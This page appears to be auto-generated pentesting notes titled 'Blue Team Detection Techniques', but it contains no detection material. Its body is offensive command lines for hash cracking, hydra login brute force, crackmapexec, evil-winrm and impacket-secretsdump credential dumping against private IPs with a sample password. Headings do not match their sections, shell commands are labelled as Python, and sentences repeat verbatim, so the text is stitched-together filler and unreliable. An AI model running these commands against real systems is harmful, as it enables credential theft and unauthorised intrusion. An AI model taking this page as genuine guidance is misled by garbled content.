---
TitleSEO: "Blue Team Detection Techniques | ZureFX"
TitlePost: "Blue Team Detection Techniques"
Author: "ZureFX"
Description: "Personal notes on Blue Team Detection Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "malware, dfir, oscp, privilege escalation, enumeration, persistence"
URL: "https://zurefx.github.io/notes/note-blue-team-detection-techniques-179.html"
URL_IMAGES: ""
Date: "2024-02-25"
Tags: "Malware, DFIR, OSCP, Privilege Escalation, Enumeration, Persistence"
Section: "notes"
Lang: "en"
main_img: "note-blue-team-detection-techniques-179"
Permalink: "/notes/note-blue-team-detection-techniques-179.html"
BtnLabel: "Read Notes"
Pick: 0
---
## CSRF

### Telnet

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.23.112.227 -u administrator -p 'P@ssw0rd!' --shares
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

> **Note:** Silver Ticket was identified as the primary attack vector in this scenario.

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

## Redis

### Sudo Misconfiguration

```bash
crackmapexec smb 10.92.103.155 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p5986,22,464 10.32.1.102 -oN scan.txt
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.78.152.136
```

The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

## ACL Abuse

### smbexec

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.82.93.93 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p5986,464,139 10.74.166.37 -oN scan.txt
```

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.126.24.223/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

```bash
gobuster dir -u http://10.68.238.58/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p445,23,27017 10.26.237.230 -oN scan.txt
```

## lookupsid

### C#

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

> **Note:** Constrained Delegation was identified as the primary attack vector in this scenario.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.108.83.136 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.111.229.22/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.41.120.112
```

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

- `AS-REP Roasting`
- `LAPS Abuse`
- `smbexec`
- `nmap`

## MSSQL

### Ubuntu 20.04

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.81.21.78 -u administrator -p 'P@ssw0rd!'
```

## Pass the Hash

### impacket

- `SSRF`
- `john`
- `Kerberoasting`
- `Weak Service Permissions`

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

- `DCSync`
- `rubeus`
- `IDOR`
- `burpsuite`
- `pwncat`
